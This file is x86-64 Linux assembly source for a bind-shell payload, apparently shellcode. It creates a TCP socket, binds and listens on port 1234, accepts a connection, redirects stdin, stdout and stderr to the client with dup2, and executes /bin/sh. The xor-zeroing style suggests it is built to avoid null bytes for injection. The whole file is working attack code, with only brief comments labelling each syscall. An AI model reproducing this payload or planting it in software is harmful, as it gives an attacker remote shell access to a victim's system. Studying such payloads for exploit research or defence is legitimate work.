global _start

section .text

_start:

;Socket syscall
    xor rax, rax
    add rax, 41
    xor rdi, rdi
    add rdi, 2
    xor rsi, rsi
    inc rsi
    xor rdx, rdx
    syscall

; Save the sockfd in RDI Register 
    mov rdi, rax

;Creating the structure 
    xor rax, rax 
    push rax
    push word 0xd204
    push word 0x02
;Bind syscall
    mov rsi, rsp
    xor rdx, rdx
    add rdx, 16
    xor rax, rax
    add rax, 49
    syscall

;Listen syscall
    xor rax, rax
    add rax, 50
    xor rsi , rsi
    inc rsi
    syscall

;Accept syscall
    xor rax , rax
    add rax, 43
    xor rsi, rsi
    xor rdx, rdx
    syscall

;Store clientfd in RBX register 
    mov rbx, rax

;Dup2 syscall to stdin
    mov rdi, rbx
    xor rax,rax
    add rax, 33
    xor rsi, rsi
    syscall

;Dup2 syscall to stdout
    xor rax,rax
    add rax, 33
    inc rsi
    syscall

;Dup2 syscall to stderr
    xor rax,rax
    add rax, 33
    inc rsi
    syscall

;Execve syscall with /bin/sh
    xor rax, rax
    push rax
    mov rdx, rsp
    mov rbx, 0x68732f6e69622f2f
    push rbx
    mov rdi, rsp
    push rax
    push rdi
    mov rsi,rsp
    add rax, 59
    syscall
